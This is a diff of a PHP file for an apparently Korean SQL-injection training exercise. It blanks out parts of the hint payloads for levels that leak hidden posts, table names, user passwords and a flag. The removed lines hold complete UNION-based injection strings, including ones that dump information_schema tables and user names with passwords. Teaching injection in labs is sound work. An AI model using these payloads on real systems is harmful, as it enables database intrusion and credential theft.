@@ -26,24 +26,24 @@ $stmt = null;
 // 미션 정보 설정
 $mission_title = '숨겨진 게시글 열람';
 $mission_goal = '검색창에 SQL 인젝션을 입력하여 숨겨진 게시글(<code>is_hidden = TRUE</code>)을 열람하세요.';
-$mission_hint = "' OR 1=1 UNION SELECT id, title, content FROM posts WHERE is_hidden = 1 ;--";
+$mission_hint = "' __ ___ _____ ______ id, title, content ____ posts WHERE _________ = 1 ;--";
 $answer_hint = "숨겨진 게시글의 제목 또는 내용을 입력하세요.";
 
 if ($level === '3') {
     $mission_title = 'DB 구조 유출';
     $mission_goal = '검색창에 SQL 인젝션을 입력하여 데이터베이스 테이블 구조를 유출하세요.';
-    $mission_hint = "' OR 1=1 UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema = DATABASE() -- -
+    $mission_hint = "' __ ___ _____ ______ null, table_name, null ____ information_schema.tables WHERE table_schema = DATABASE() -- -
 ";
     $answer_hint = "유출된 테이블 이름 중 하나를 입력하세요.";
 } elseif ($level === '4') {
     $mission_title = '사용자 비밀번호 탈취';
     $mission_goal = '검색창에 SQL 인젝션을 입력하여 사용자 아이디와 비밀번호를 탈취하세요.';
-    $mission_hint = "' OR 1=1 UNION SELECT null, name, passwd FROM user_info ;--";
+    $mission_hint = "' __ ___ _____ ______ null, name, passwd ____ _________ ;--";
     $answer_hint = "관리자 계정의 비밀번호를 입력하세요.";
 } elseif ($level === '5') {
     $mission_title = '플래그 획득';
     $mission_goal = '검색창에 SQL 인젝션을 입력하여 비밀 플래그를 획득하세요.';
-    $mission_hint = "' OR 1=1 UNION SELECT null, id, flag FROM flags WHERE is_secret = TRUE ;--";
+    $mission_hint = "' __ ___ _____ ______ null, id, flag ____ flags _____ is_secret = TRUE ;--";
     $answer_hint = "획득한 플래그 값을 입력하세요.";
 }
 
